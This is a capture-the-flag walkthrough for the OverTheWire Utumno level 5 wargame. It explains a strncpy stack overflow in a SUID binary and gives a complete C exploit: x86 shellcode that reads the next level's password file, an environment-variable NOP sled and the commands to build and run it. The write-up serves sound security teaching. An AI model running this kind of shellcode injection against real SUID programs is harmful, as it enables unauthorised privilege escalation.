# OverTheWire — Utumno Level 5 Solution (utumno5 → utumno6)

> Goal: Get utumno6 user's password from `utumno5`.
> Technique: **`strncpy` without null-termination** in `hihi()` → full 4-byte ret overwrite;
> argc trick (utumno2) + env-var shellcode on executable stack + embedded `cat` command.

---

## 1. Connection

```bash
ssh utumno5@utumno.labs.overthewire.org -p 2227
# password: **********   (from the previous level)
```

---

## 2. Recon

```bash
ls -la /utumno/utumno5
# -r-sr-x--- 1 utumno6 utumno5 13096 utumno5   <-- SUID utumno6, group utumno5 = READABLE
strings /utumno/utumno5
#   strcpy, strncpy, strlen, printf, "Aw..", "Here we go - %s", "hihi"
#   ... -fno-stack-protector ...                <-- NO canary
readelf -l /utumno/utumno5 | grep GNU_STACK
#   GNU_STACK ... RWE                            <-- stack EXECUTABLE
/utumno/utumno5 < /dev/null   # "Aw.."  (argc check)
```

---

## 3. Static Analysis

### `main`
```c
int main(int argc, char **argv) {
    if (argc == 0) goto proceed;
    if (argc != 1) { puts("Aw.."); exit(1); }
    if (argv[0][0] == '\0') goto proceed;     // argc==1 && empty argv[0]
    puts("Aw.."); exit(1);
proceed:
    printf("Here we go - %s\n", argv[10]);    // argv[10] = *(argv+0x28)
    hihi(argv[10]);
    return 0;
}
```
**Same argc constraint** as utumno2 (`argc==0` or `argc==1`+empty argv[0]) and **same `argv[10]`** source.

### `hihi` (actual vulnerability)
```bash
objdump -d -M intel /utumno/utumno5 | sed -n '/<hihi>:/,/^$/p'
```
```c
void hihi(char *s) {
    char buf[12];                 // ebp-0xc
    if (strlen(s) <= 19)
        strcpy(buf, s);           // <=19: copies + adds NULL (last byte of ret becomes 0)
    else
        strncpy(buf, s, 20);      // >19: exactly 20 bytes, NO NULL ADDED  <<< use this
}
```

- `buf = ebp-0xc` (12 bytes), return address at `ebp+4` → distance = `0xc + 4 = 16`.
- **`strncpy` branch (len > 19):** 20 bytes copied, no null added → `s[16..19]` = all **4 bytes of
  return address** (no null problem). 12 (buf) + 4 (saved ebp) + 4 (ret) = 20.
- **`strcpy` branch (len ≤ 19):** copy ends with null → last byte of ret becomes 0 (unusable).

⇒ Give a **20-byte** payload with `strlen(s) > 19`: `16 padding + 4 ret`.

---

## 4. Strategy (same skeleton as utumno2)

- `execve(argv={NULL})` → kernel forces `argc=1`, `argv[0]=""` → `proceed`. `argv[10] = envp[8]`
  (kernel forces this). For robustness, put payload in both `envp[8]` and `envp[9]`.
- Payload = `"BBBBBBBBBBBBBBBB"` (16) + `RET` (4) = 20 bytes → `strlen=20>19` → strncpy branch.
- `RET` points to NOP sled in `EGG` env variable (stack RWE, ASLR off).
- Shellcode is self-contained: `/bin/sh -c "cat /etc/utumno_pass/utumno6"` (only difference
  from utumno4: command string changes `utumno5`→`utumno6`, byte `0x35`→`0x36`).
- Address found via printer (`environ[0] + 4 + 30000`, sled midpoint).

---

## 5. Final Exploit

### `ex5.c`
```c
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
unsigned char sc[]={ /* null-free: setreuid; execve /bin/sh -c "cat .../utumno6" */
 0x31,0xc0,0xb0,0xc9,0xcd,0x80,0x89,0xc3,0x89,0xc1,0x31,0xc0,0xb0,0xcb,0xcd,0x80,
 0x31,0xc0,0x50,
 0x68,0x6d,0x6e,0x6f,0x36, 0x68,0x2f,0x75,0x74,0x75, 0x68,0x70,0x61,0x73,0x73,
 0x68,0x6d,0x6e,0x6f,0x5f, 0x68,0x2f,0x75,0x74,0x75, 0x68,0x2f,0x65,0x74,0x63,
 0x68,0x63,0x61,0x74,0x20, 0x89,0xe6,
 0x31,0xc0,0x50, 0x66,0xc7,0x04,0x24,0x2d,0x63, 0x89,0xe7,
 0x31,0xc0,0x50, 0x68,0x2f,0x2f,0x73,0x68, 0x68,0x2f,0x62,0x69,0x6e, 0x89,0xe5,
 0x31,0xc0,0x50,0x56,0x57,0x55, 0x89,0xe1,0x89,0xeb,0x31,0xd2,0x31,0xc0,0xb0,0x0b,0xcd,0x80};
#define SLED 60000
static char eggenv[4+SLED+256];
static char payload[24];
static char *envp[12];
void build(unsigned int ret){
 memcpy(eggenv,"EGG=",4); memset(eggenv+4,0x90,SLED);
 memcpy(eggenv+4+SLED,sc,sizeof sc); eggenv[4+SLED+sizeof sc]=0;
 memset(payload,'B',16); *(unsigned int*)(payload+16)=ret; payload[20]=0;  /* len 20 > 19 */
 envp[0]=eggenv;
 for(int i=1;i<=7;i++) envp[i]="AA=AA";
 envp[8]=payload; envp[9]=payload; envp[10]=0;
}
int main(int argc,char**argv){
 char *av[]={0};
 if(argc>=2 && !strcmp(argv[1],"find")){ build(0x42424242); execve("/tmp/p2A7xK9mLq",av,envp); }
 else if(argc>=3 && !strcmp(argv[1],"run")){ build(strtoul(argv[2],0,16)); execve("/utumno/utumno5",av,envp); }
 perror("execve"); return 1;
}
```

### `pr.c`
```c
#include <stdio.h>
extern char **environ;
int main(){ printf("ENVADDR=%p\n",(void*)environ[0]); return 0; }
```

### Execution
```bash
gcc -m32 -o ex5 ex5.c
gcc -m32 -o /tmp/p2A7xK9mLq pr.c        # 15-char path (use a fresh path for this user)

ENV0=$(./ex5 find | sed -n 's/.*ENVADDR=0x\([0-9a-f]*\).*/\1/p')
RET=$(python3 -c "print('%x'%(int('$ENV0',16)+4+30000))")
./ex5 run "$RET"          # strncpy ret overwrite -> sled -> shellcode -> cat
```

Output:
```
ENV0=fffef4cb RET=ffff69ff
**********
```

---


## Summary / Lessons Learned

| Topic | Note |
|-------|------|
| **`strcpy` vs `strncpy`** | `strcpy` adds null (last byte of ret = 0); `strncpy(.,.,20)` does NOT add null → full ret overwrite |
| **Choose the length branch** | `strlen(s) > 19` deliberately enters the `strncpy` branch → 4-byte ret overwritten |
| **Offset 16** | `buf=ebp-0xc` → 12 + 4 (saved ebp) = 16 |
| **argc trick again** | Same as utumno2: `argv[10]=envp[8/9]`, `execve argv={NULL}` |
| **Reused skeleton** | Same launcher + self-contained shellcode (only level number changes in command) |
| **/tmp conflict** | Previous level's owner's `/tmp` printer can't be overwritten → use a fresh path |
